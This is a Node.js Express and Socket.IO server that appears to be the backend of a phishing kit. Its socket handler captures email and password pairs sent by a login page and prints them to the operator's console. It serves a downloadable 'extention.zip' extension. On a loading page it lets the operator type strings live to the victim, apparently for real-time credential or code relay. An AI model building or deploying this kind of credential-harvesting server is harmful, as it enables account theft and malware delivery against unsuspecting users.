const express = require('express');
const socketIo = require('socket.io');
const http = require('http');
const path = require('path');
const readline = require('readline');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// Serve static files
app.use(express.static(__dirname));

// Serve the extension as a downloadable .zip file
app.get('/download-extension', (req, res) => {
  const filePath = path.join(__dirname, 'extention.zip'); // Ensure correct path here
  if (fs.existsSync(filePath)) {
    res.download(filePath); // This will prompt the user to download the file
  } else {
    res.status(404).send('Extension not found.');
  }
});


app.get('/index.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/loading-screen.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'loading-screen.html'));
});

// Handle WebSocket connections
io.on('connection', (socket) => {
  console.log('A user connected.');

  // Handle login event (email and password input from the user)
  socket.on('login', (data) => {
    const { email, password } = data;

    // Log email in green if it exists
    if (email) {
      console.log(`\x1b[32mEmail from client: ${email}\x1b[0m`); // Logs email in green using ANSI code
    }

    // Log password in green if it exists
    if (password) {
      console.log(`\x1b[32mPassword from client: ${password}\x1b[0m`); // Logs password in green using ANSI code
    }
  });

  // Listen for the "loadingPageVisited" event
  socket.on('loadingPageVisited', () => {
    // Ask for input in the terminal when the user is on the loading page
    rl.question("Enter a string to send to the client: ", (userInput) => {
      console.log(`Sending input: ${userInput}`);

      // Send the input back to the client
      socket.emit('serverInput', userInput);
    });
  });

  // Handle disconnection
  socket.on('disconnect', () => {
    console.log('A user disconnected.');
  });
});

// Start the server
const PORT = 3000;
server.listen(PORT, () => {
  console.log(`Server is running at http://localhost:${PORT}`);
});
